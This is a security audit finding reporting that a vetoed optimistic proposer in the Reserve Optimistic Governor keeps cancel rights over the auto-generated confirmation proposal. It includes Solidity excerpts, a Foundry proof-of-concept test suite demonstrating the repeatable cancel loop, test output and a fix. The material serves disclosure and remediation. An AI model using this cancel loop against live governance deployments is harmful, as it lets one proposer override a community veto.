# Vetoed Optimistic Proposer Retains Cancellation Rights Over Auto-Generated Confirmation Proposal


## Description

## Summary
When an optimistic proposal is vetoed by the community, the protocol automatically spawns a standard confirmation proposal to let governance vote on the same action through the slow path. However, the confirmation proposal inherits the original optimistic proposer as its `proposer`. Because `_validateCancel` allows any proposer to cancel their own standard proposal while it is in the `Pending` state, the vetoed proposer can immediately cancel the confirmation before any vote occurs, permanently nullifying the community's veto. The attack is repeatable within each throttle window, and the throttle is the only rate-limiting protection.


## Finding Description
The vulnerability arises from the combination of two independent design decisions that are individually reasonable but unsafe together.

**First**, `ProposalLib.transitionToPessimistic` directly inherits the original optimistic proposer when creating the confirmation proposal:

```solidity
// contracts/governance/lib/ProposalLib.sol
// transitionToPessimistic()

ProposalData memory proposalData = ProposalData(
    newProposalId,
    governor.proposalProposer(proposalId), // ← original optimistic proposer inherited
    optimisticProposal.targets,
    optimisticProposal.values,
    optimisticProposal.calldatas,
    newDescription
);

_saveProposal(proposalData, proposalCores[newProposalId], governor.votingDelay(), governor.votingPeriod());
```

**Second**, `_validateCancel` allows a proposer to cancel their own standard (non-optimistic) proposal if and only if it is still `Pending`:

```solidity
// contracts/governance/ReserveOptimisticGovernor.sol
// _validateCancel()

function _validateCancel(uint256 proposalId, address caller) internal view override returns (bool) {
    TimelockControllerOptimistic t = _timelock();

    if (t.hasRole(CANCELLER_ROLE, caller)) {
        return true;
    }

    if (caller != proposalProposer(proposalId)) {
        return false;
    }

    ProposalState s = state(proposalId);

    return _isOptimistic(proposalId) ? s != ProposalState.Defeated : s == ProposalState.Pending;
    //                                                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^
    //                                                                  confirmation is standard =>
    //                                                                  cancellable while Pending
}
```

Because the confirmation proposal is standard (`vetoThreshold == 0`, so `_isOptimistic` returns `false`) and always starts in `Pending` during the `votingDelay` window, the right-hand branch applies. The original optimistic proposer — who was just overruled by the community — can call `cancel()` on the confirmation proposal at any point before `votingDelay` elapses, and it will succeed.

**Attack sequence:**
1. `optimisticProposer` calls `proposeOptimistic(targets, values, calldatas, desc_A)` — costs 1 throttle charge
2. Community casts enough AGAINST votes to cross `vetoThreshold` → `transitionToPessimistic` creates confirmation proposal `C_A` with `proposer = optimisticProposer`, state = `Pending`
3. `optimisticProposer` immediately calls `cancel(targets, values, calldatas, keccak256("Confirmation For: " + desc_A))` — succeeds, `C_A` is `Canceled`
4. `optimisticProposer` re-submits with `desc_B` (a trivially different description) to obtain a new `proposalId`, since `desc_A`'s optimistic proposal is `Defeated` and cannot be reused
5. Repeat from step 2

The proposer cannot reuse the exact same description because the original optimistic proposal remains on-chain in `Defeated` state with `voteStart != 0`, causing `_validateProposal` to revert. A trivial description change (adding a counter, a space, etc.) is all that is needed to obtain a fresh `proposalId` and repeat the loop.


## Root cause
- `contracts/governance/lib/ProposalLib.soltransitionToPessimistic()` ~L135

- `contracts/governance/ReserveOptimisticGovernor.sol_validateCancel()` ~L325


## Impact Explanation
The veto mechanism is the community's only non-admin, on-chain defense against fast optimistic proposals. If the vetoed proposer can cancel the resulting confirmation proposal before it reaches a vote, the veto is completely ineffective. The governance action the community explicitly rejected can be re-proposed immediately, and the entire cycle repeats.

Because the attack only requires gas and throttle charges, it has no economic cost beyond transaction fees. The confirmation proposal is canceled before any voter has a chance to act — no front-running or timing precision is required, as the `Pending` window spans the entire `votingDelay` period (set to 1 day in the test suite, configurable by governance).

A malicious or compromised `OPTIMISTIC_PROPOSER_ROLE` holder can use this to push through proposals that the community has already voted to reject, effectively rendering the pessimistic governance path a dead letter against a determined proposer.


## Likelihood Explanation
The `OPTIMISTIC_PROPOSER_ROLE` is a permissioned role granted by the timelock to trusted parties. In the expected deployment, the set of proposers is small and known. A fully honest proposer would not exploit this. However:

- The role is granted to external addresses and can be compromised
- The incentive to exploit this exists any time a proposer has a strong interest in pushing a specific on-chain action that the community opposes
- The attack requires no special technical sophistication — it is a single `cancel()` call

The throttle capacity (2–12 proposals per 12-hour window) means the attack is not infinite within a single window, but the window refills continuously, making sustained suppression viable for a motivated actor.


## Proof of Concept
Run: `forge test --match-path "test/PoC_ProposerCancelsConfirmation.t.sol" -vvv`




```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title PoC_ProposerCancelsConfirmation
 *
 * FINDING: — Optimistic Proposer Can Cancel Auto-Generated Confirmation Proposal
 *
 * ROOT CAUSE:
 *   `ProposalLib.transitionToPessimistic` assigns the original optimistic proposer as the
 *   proposer of the newly-created confirmation proposal.  `_validateCancel` then allows any
 *   proposer to cancel their own *standard* (non-optimistic) proposal while it is still
 *   `Pending` (i.e. during the entire `votingDelay` window).  Because the confirmation
 *   proposal is standard and starts in `Pending`, the vetoed proposer can cancel it
 *   immediately after the transition, and governance never reaches a vote.
 *
 * ATTACK LOOP (bounded only by proposal throttle):
 *   1. Optimistic proposer submits proposal P_n (costs 1 throttle charge).
 *   2. Community reaches veto threshold → confirmation proposal C_n is spawned, state = Pending.
 *   3. Proposer calls cancel(C_n) before votingDelay elapses — succeeds.
 *   4. Proposer re-submits with a slightly different description to obtain a new proposalId
 *      (original P_n is Defeated, so same description would revert in _validateProposal).
 *   5. Goto 2.
 *
 *   With PROPOSAL_THROTTLE_CAPACITY = 2 (test default) and a 12-hour refill period the
 *   proposer can execute 2 cancel-loops immediately, then 1 more every ~6 hours.
 *   At the protocol maximum of MAX_PROPOSAL_THROTTLE_CAPACITY = 12 the attacker can
 *   suppress 12 confirmation votes inside a single 12-hour window.
 *
 * TESTS IN THIS FILE:
 *   test_singleCancelLoop — shows the base-case: veto → cancel → governance denied
 *   test_doubleCancelLoop — shows two back-to-back loops with both throttle charges
 *   test_cancelOnlyInPendingWindow — confirms the cancel must happen BEFORE votingDelay ends
 *   test_throttleEventuallyBlocks  — shows the throttle does eventually kick in (finite window)
 */

import { Test } from "forge-std/Test.sol";

import { IGovernor } from "@openzeppelin/contracts/governance/IGovernor.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import { IOptimisticSelectorRegistry } from "@interfaces/IOptimisticSelectorRegistry.sol";
import { IReserveOptimisticGovernor } from "@interfaces/IReserveOptimisticGovernor.sol";
import { IReserveOptimisticGovernorDeployer } from "@interfaces/IDeployer.sol";

import { OptimisticSelectorRegistry } from "@governance/OptimisticSelectorRegistry.sol";
import { ReserveOptimisticGovernor } from "@governance/ReserveOptimisticGovernor.sol";
import { TimelockControllerOptimistic } from "@governance/TimelockControllerOptimistic.sol";

import { ReserveOptimisticGovernorDeployer } from "@src/Deployer.sol";
import { Guardian } from "@src/Guardian.sol";
import { ReserveOptimisticGovernanceVersionRegistry } from "@src/VersionRegistry.sol";
import { RewardTokenRegistry } from "@staking/RewardTokenRegistry.sol";
import { StakingVault } from "@staking/StakingVault.sol";

import { MockERC20 } from "@mocks/MockERC20.sol";
import { MockRoleRegistry } from "@mocks/MockRoleRegistry.sol";

import {
    CANCELLER_ROLE,
    MAX_PROPOSAL_THROTTLE_CAPACITY,
    OPTIMISTIC_PROPOSER_ROLE,
    PROPOSAL_THROTTLE_PERIOD
} from "@utils/Constants.sol";

// ══════════════════════════════════════════════════════════════════════════════
//  Shared setup — mirrors ReserveOptimisticGovernorTestBase exactly
// ══════════════════════════════════════════════════════════════════════════════
abstract contract PoCBase is Test {
    // ----- deployed contracts -----
    MockERC20 public underlying;
    StakingVault public stakingVault;
    OptimisticSelectorRegistry public registry;
    Guardian public guardianContract;
    ReserveOptimisticGovernorDeployer public deployer;
    ReserveOptimisticGovernor public governor;
    TimelockControllerOptimistic public timelock;

    // ----- actors -----
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public carol = makeAddr("carol");
    address public guardian = makeAddr("guardian");
    address public optimisticGuardian = makeAddr("optimisticGuardian");
    address public optimisticGuardianManager = makeAddr("optimisticGuardianManager");
    address public optimisticProposer = makeAddr("optimisticProposer");

    // ----- governance params (same as test suite) -----
    uint48 internal constant VETO_DELAY = 1 hours;
    uint32 internal constant VETO_PERIOD = 2 hours;
    uint256 internal constant VETO_THRESHOLD = 0.2e18; // 20 %

    uint48 internal constant VOTING_DELAY = 1 days;
    uint32 internal constant VOTING_PERIOD = 1 weeks;
    uint48 internal constant VOTE_EXTENSION = 1 days;
    uint256 internal constant PROPOSAL_THRESHOLD = 0.01e18;
    uint256 internal constant QUORUM_NUMERATOR = 0.1e18;
    uint256 internal constant TIMELOCK_DELAY = 2 days;

    // Use capacity = 2 to keep loops manageable; attack is qualitatively identical
    // at MAX_PROPOSAL_THROTTLE_CAPACITY = 12.
    uint256 internal constant PROPOSAL_THROTTLE_CAPACITY = 2;

    uint256 internal constant REWARD_HALF_LIFE = 1 days;
    uint256 internal constant UNSTAKING_DELAY = 0;

    // ----- voter balances -----
    uint256 internal constant ALICE_STAKE = 400_000e18; // 40 %  — exceeds 20 % veto threshold alone
    uint256 internal constant BOB_STAKE = 400_000e18;
    uint256 internal constant CAROL_STAKE = 200_000e18;

    string internal constant CONFIRMATION_PREFIX = "Confirmation For: ";

    // ── setUp ────────────────────────────────────────────────────────────────
    function setUp() public {
        underlying = new MockERC20("Underlying Token", "UNDL");

        MockRoleRegistry roleRegistry = new MockRoleRegistry(address(this));
        ReserveOptimisticGovernanceVersionRegistry versionRegistry =
            new ReserveOptimisticGovernanceVersionRegistry(roleRegistry);
        RewardTokenRegistry rewardTokenRegistry = new RewardTokenRegistry(roleRegistry);

        StakingVault stakingVaultImpl = new StakingVault();
        ReserveOptimisticGovernor governorImpl = new ReserveOptimisticGovernor();
        TimelockControllerOptimistic timelockImpl = new TimelockControllerOptimistic();
        OptimisticSelectorRegistry registryImpl = new OptimisticSelectorRegistry();

        address[] memory initialGuardians = new address[](1);
        initialGuardians[0] = optimisticGuardian;
        guardianContract = new Guardian(guardian, optimisticGuardianManager, initialGuardians);

        deployer = new ReserveOptimisticGovernorDeployer(
            address(versionRegistry),
            address(rewardTokenRegistry),
            address(guardianContract),
            address(stakingVaultImpl),
            address(governorImpl),
            address(timelockImpl),
            address(registryImpl)
        );
        versionRegistry.registerVersion(deployer);

        address[] memory optimisticProposers = new address[](1);
        optimisticProposers[0] = optimisticProposer;

        bytes4[] memory transferSelectors = new bytes4[](1);
        transferSelectors[0] = IERC20.transfer.selector;

        IOptimisticSelectorRegistry.SelectorData[] memory selectorData =
            new IOptimisticSelectorRegistry.SelectorData[](1);
        selectorData[0] = IOptimisticSelectorRegistry.SelectorData(address(underlying), transferSelectors);

        IReserveOptimisticGovernorDeployer.BaseDeploymentParams memory baseParams =
            IReserveOptimisticGovernorDeployer.BaseDeploymentParams({
                optimisticParams: IReserveOptimisticGovernor.OptimisticGovernanceParams({
                    vetoDelay: VETO_DELAY,
                    vetoPeriod: VETO_PERIOD,
                    vetoThreshold: VETO_THRESHOLD
                }),
                standardParams: IReserveOptimisticGovernor.StandardGovernanceParams({
                    votingDelay: VOTING_DELAY,
                    votingPeriod: VOTING_PERIOD,
                    voteExtension: VOTE_EXTENSION,
                    proposalThreshold: PROPOSAL_THRESHOLD,
                    quorumNumerator: QUORUM_NUMERATOR
                }),
                selectorData: selectorData,
                optimisticProposers: optimisticProposers,
                additionalGuardians: new address[](0),
                timelockDelay: TIMELOCK_DELAY,
                proposalThrottleCapacity: PROPOSAL_THROTTLE_CAPACITY
            });

        IReserveOptimisticGovernorDeployer.NewStakingVaultParams memory newStakingVaultParams =
            IReserveOptimisticGovernorDeployer.NewStakingVaultParams({
                underlying: IERC20Metadata(address(underlying)),
                rewardTokens: new address[](0),
                rewardHalfLife: REWARD_HALF_LIFE,
                unstakingDelay: UNSTAKING_DELAY
            });

        (address stakingVaultAddr, address governorAddr, address timelockAddr, address selectorRegistryAddr) =
            deployer.deployWithNewStakingVault(baseParams, newStakingVaultParams, bytes32(0));

        governor = ReserveOptimisticGovernor(payable(governorAddr));
        timelock = TimelockControllerOptimistic(payable(timelockAddr));
        registry = OptimisticSelectorRegistry(selectorRegistryAddr);
        stakingVault = StakingVault(stakingVaultAddr);

        _setupVoter(alice, ALICE_STAKE);
        _setupVoter(bob, BOB_STAKE);
        _setupVoter(carol, CAROL_STAKE);

        // Recharge throttle to full capacity (same as base test suite)
        vm.warp(block.timestamp + 12 hours);
    }

    // ── shared helpers ───────────────────────────────────────────────────────

    function _setupVoter(address voter, uint256 amount) internal {
        underlying.mint(voter, amount);
        vm.startPrank(voter);
        underlying.approve(address(stakingVault), amount);
        stakingVault.depositAndDelegate(amount);
        vm.stopPrank();
    }

    function _singleCall(address target, uint256 value, bytes memory callData)
        internal
        pure
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas)
    {
        targets = new address[](1);
        values = new uint256[](1);
        calldatas = new bytes[](1);
        targets[0] = target;
        values[0] = value;
        calldatas[0] = callData;
    }

    function _confirmationDescription(string memory description) internal pure returns (string memory) {
        return string.concat(CONFIRMATION_PREFIX, description);
    }

    function _confirmationProposalId(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) internal view returns (uint256) {
        return governor.getProposalId(
            targets, values, calldatas, keccak256(bytes(_confirmationDescription(description)))
        );
    }

    /// @dev Warp to one second after the snapshot so the proposal becomes Active.
    function _warpToActive(uint256 proposalId) internal {
        vm.warp(governor.proposalSnapshot(proposalId) + 1);
    }

    /// @dev Warp to one second after the deadline.
    function _warpPastDeadline(uint256 proposalId) internal {
        vm.warp(governor.proposalDeadline(proposalId) + 1);
    }

    /// @dev Trigger the veto: Alice's 40 % stake alone exceeds the 20 % threshold.
    ///      Vote type 0 = Against (same convention as existing test suite).
    function _vetoProposal(uint256 proposalId) internal {
        _warpToActive(proposalId);
        vm.prank(alice);
        governor.castVote(proposalId, 0); // 0 = Against
    }
}

// ══════════════════════════════════════════════════════════════════════════════
//  PoC Tests
// ══════════════════════════════════════════════════════════════════════════════
contract PoC_R01_ProposerCancelsConfirmation is PoCBase {
    // ── Test 1: single cancel loop ───────────────────────────────────────────

    /**
     * @notice Base-case: community vetoes an optimistic proposal, the spawned confirmation
     *         proposal is immediately canceled by the original proposer, preventing any vote.
     *
     * Expected outcome: confirmationProposalId ends up Canceled, not Defeated or Executed.
     */
    function test_R01_singleCancelLoop() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) =
            _singleCall(address(underlying), 0, abi.encodeCall(IERC20.transfer, (alice, 1_000e18)));
        string memory description = "R01 attack: single loop";

        // ── Step 1: proposer submits optimistic proposal ──────────────────────
        vm.prank(optimisticProposer);
        uint256 optimisticId = governor.proposeOptimistic(targets, values, calldatas, description);

        assertEq(
            uint256(governor.state(optimisticId)),
            uint256(IGovernor.ProposalState.Pending),
            "optimistic proposal should be Pending"
        );

        // ── Step 2: community vetoes (Alice's 40% > 20% threshold) ────────────
        _vetoProposal(optimisticId);

        assertEq(
            uint256(governor.state(optimisticId)),
            uint256(IGovernor.ProposalState.Defeated),
            "optimistic proposal should be Defeated after veto"
        );

        uint256 confirmationId = _confirmationProposalId(targets, values, calldatas, description);

        assertEq(
            uint256(governor.state(confirmationId)),
            uint256(IGovernor.ProposalState.Pending),
            "confirmation should be Pending (in votingDelay window)"
        );

        // Confirm the confirmation proposer is the ORIGINAL optimistic proposer.
        assertEq(
            governor.proposalProposer(confirmationId),
            optimisticProposer,
            "confirmation proposer must be original optimistic proposer"
        );

        // ── Step 3: ATTACK — original proposer cancels the confirmation ────────
        // The cancel happens during the Pending (votingDelay) window.
        // _validateCancel: caller == proposer AND state == Pending AND !isOptimistic  → true
        vm.prank(optimisticProposer);
        governor.cancel(targets, values, calldatas, keccak256(bytes(_confirmationDescription(description))));

        // ── Step 4: assert the veto outcome was nullified ─────────────────────
        assertEq(
            uint256(governor.state(confirmationId)),
            uint256(IGovernor.ProposalState.Canceled),
            "VULN: confirmation was canceled by the vetoed proposer, community veto neutralized"
        );
    }

    // ── Test 2: double cancel loop (uses both throttle charges) ─────────────

    /**
     * @notice The proposer exhausts both throttle charges to cancel two successive
     *         confirmation proposals, showing the attack is repeatable within a window.
     *
     *         Cycle A: description "loop A"  → vetoed → confirmation canceled
     *         Cycle B: description "loop B"  → vetoed → confirmation canceled
     *
     *         Both cycles complete before the throttle is exhausted, proving the
     *         throttle (capacity = 2) only provides finite, not permanent, protection.
     */
    function test_R01_doubleCancelLoop() public {
        // ════════════════ CYCLE A ════════════════════════════════════════════

        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) =
            _singleCall(address(underlying), 0, abi.encodeCall(IERC20.transfer, (alice, 1_000e18)));
        string memory descA = "R01 attack: loop A";

        // Throttle charges available before attack
        uint256 chargesBefore = governor.proposalThrottleCharges(optimisticProposer);
        assertEq(chargesBefore, PROPOSAL_THROTTLE_CAPACITY, "throttle should be full at start");

        // --- Cycle A: propose ---
        vm.prank(optimisticProposer);
        uint256 optimisticIdA = governor.proposeOptimistic(targets, values, calldatas, descA);

        assertEq(
            governor.proposalThrottleCharges(optimisticProposer),
            chargesBefore - 1,
            "one throttle charge consumed"
        );

        // --- Cycle A: community vetoes ---
        _vetoProposal(optimisticIdA);

        uint256 confirmIdA = _confirmationProposalId(targets, values, calldatas, descA);
        assertEq(
            uint256(governor.state(confirmIdA)),
            uint256(IGovernor.ProposalState.Pending),
            "cycle A: confirmation should be Pending"
        );

        // --- Cycle A: proposer cancels ---
        vm.prank(optimisticProposer);
        governor.cancel(targets, values, calldatas, keccak256(bytes(_confirmationDescription(descA))));

        assertEq(
            uint256(governor.state(confirmIdA)),
            uint256(IGovernor.ProposalState.Canceled),
            "cycle A: confirmation canceled — veto nullified"
        );

        // ════════════════ CYCLE B ════════════════════════════════════════════
        // Proposer must use a NEW description because the original optimistic proposal
        // for descA is Defeated (voteStart != 0), so re-proposing the same description
        // would revert in _validateProposal.
        string memory descB = "R01 attack: loop B";

        // --- Cycle B: propose (second throttle charge) ---
        vm.prank(optimisticProposer);
        uint256 optimisticIdB = governor.proposeOptimistic(targets, values, calldatas, descB);

        assertEq(
            governor.proposalThrottleCharges(optimisticProposer),
            0,
            "both throttle charges now consumed"
        );

        // --- Cycle B: community vetoes ---
        _vetoProposal(optimisticIdB);

        uint256 confirmIdB = _confirmationProposalId(targets, values, calldatas, descB);
        assertEq(
            uint256(governor.state(confirmIdB)),
            uint256(IGovernor.ProposalState.Pending),
            "cycle B: confirmation should be Pending"
        );

        // --- Cycle B: proposer cancels ---
        vm.prank(optimisticProposer);
        governor.cancel(targets, values, calldatas, keccak256(bytes(_confirmationDescription(descB))));

        assertEq(
            uint256(governor.state(confirmIdB)),
            uint256(IGovernor.ProposalState.Canceled),
            "cycle B: confirmation canceled — second veto nullified"
        );

        // Two successive community veto outcomes both neutralized by the proposer.
        // Governance was denied a confirmation vote in both cases.
    }

    // ── Test 3: cancel is only possible inside Pending window ───────────────

    /**
     * @notice Confirms the cancel window is bounded by `votingDelay`.  Once the
     *         confirmation proposal transitions to Active the proposer can no longer
     *         cancel it.  This test is a control: it shows the ONLY defense the
     *         protocol currently has is letting the votingDelay elapse.
     */
    function test_R01_cancelOnlyInPendingWindow() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) =
            _singleCall(address(underlying), 0, abi.encodeCall(IERC20.transfer, (alice, 1_000e18)));
        string memory description = "R01 control: cancel after pending";

        vm.prank(optimisticProposer);
        uint256 optimisticId = governor.proposeOptimistic(targets, values, calldatas, description);

        _vetoProposal(optimisticId);

        uint256 confirmationId = _confirmationProposalId(targets, values, calldatas, description);

        // Warp past the votingDelay so the confirmation becomes Active.
        _warpToActive(confirmationId);

        assertEq(
            uint256(governor.state(confirmationId)),
            uint256(IGovernor.ProposalState.Active),
            "confirmation should be Active now"
        );

        // Proposer attempts to cancel — must revert because state is Active, not Pending.
        vm.prank(optimisticProposer);
        vm.expectRevert(
            abi.encodeWithSelector(
                IGovernor.GovernorUnableToCancel.selector, confirmationId, optimisticProposer
            )
        );
        governor.cancel(targets, values, calldatas, keccak256(bytes(_confirmationDescription(description))));

        // Community can now vote normally.
        assertEq(
            uint256(governor.state(confirmationId)),
            uint256(IGovernor.ProposalState.Active),
            "confirmation survives the cancel attempt — vote proceeds"
        );
    }

    // ── Test 4: throttle does block a THIRD proposal after capacity is drained ─

    /**
     * @notice Shows the throttle is the only rate-limiting mechanism and will
     *         eventually block the proposer — but only AFTER the capacity is
     *         exhausted.  With capacity = 2 the attacker gets 2 free cancel-loops
     *         before hitting the wall.
     *
     *         NOTE: at MAX_PROPOSAL_THROTTLE_CAPACITY = 12 the attacker gets
     *         12 cancel-loops inside a single 12-hour window.
     */
    function test_R01_throttleEventuallyBlocks() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) =
            _singleCall(address(underlying), 0, abi.encodeCall(IERC20.transfer, (alice, 1_000e18)));

        // ── Exhaust both charges ──────────────────────────────────────────────
        for (uint256 i = 0; i < PROPOSAL_THROTTLE_CAPACITY; i++) {
            string memory desc = string.concat("R01 throttle loop ", vm.toString(i));

            vm.prank(optimisticProposer);
            uint256 optimisticId = governor.proposeOptimistic(targets, values, calldatas, desc);

            _vetoProposal(optimisticId);

            vm.prank(optimisticProposer);
            governor.cancel(targets, values, calldatas, keccak256(bytes(_confirmationDescription(desc))));
        }

        assertEq(
            governor.proposalThrottleCharges(optimisticProposer),
            0,
            "throttle fully exhausted after cancel loops"
        );

        // ── Third proposal immediately blocked ────────────────────────────────
        string memory descExtra = "R01 throttle loop extra";
        vm.prank(optimisticProposer);
        vm.expectRevert(
            abi.encodeWithSelector(IReserveOptimisticGovernor.OptimisticGovernor__ProposalThrottleExceeded.selector)
        );
        governor.proposeOptimistic(targets, values, calldatas, descExtra);

        // ── But after PROPOSAL_THROTTLE_PERIOD / capacity seconds the slot refills ──
        // capacity = 2, period = 12h → 1 slot refills every 6 hours
        vm.warp(block.timestamp + (PROPOSAL_THROTTLE_PERIOD / PROPOSAL_THROTTLE_CAPACITY) + 1);

        assertEq(
            governor.proposalThrottleCharges(optimisticProposer),
            1,
            "one throttle charge refills after half the period"
        );

        // Attacker can begin a new cancel cycle.
        vm.prank(optimisticProposer);
        uint256 newId = governor.proposeOptimistic(targets, values, calldatas, descExtra);
        assertGt(newId, 0, "proposer can propose again after throttle refill");
    }
}
```

## Output
```
Ran 4 tests for test/PoC_R01_ProposerCancelsConfirmation.t.sol:PoC_R01_ProposerCancelsConfirmation
[PASS] test_R01_cancelOnlyInPendingWindow() (gas: 610211)
[PASS] test_R01_doubleCancelLoop() (gas: 1020295)
[PASS] test_R01_singleCancelLoop() (gas: 570590)
PASS] test_R01_throttleEventuallyBlocks() (gas: 1290790)
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 9.48ms (6.85ms CPU time)
```


## Recommendation
The fix should prevent the original optimistic proposer from having self-cancellation rights over the confirmation proposal.

Strip proposer on transition (preferred): Set proposer = address(0) or proposer = address(timelock) when creating the confirmation proposal in transitionToPessimistic. This means no individual EOA has self-cancel rights over the confirmation; only CANCELLER_ROLE holders (the Guardian) can cancel it.

```solidity
// ProposalLib.transitionToPessimistic()
ProposalData memory proposalData = ProposalData(
    newProposalId,
    address(0),                          // no self-cancel rights on confirmation
    optimisticProposal.targets,
    optimisticProposal.values,
    optimisticProposal.calldatas,
    newDescription
);
```

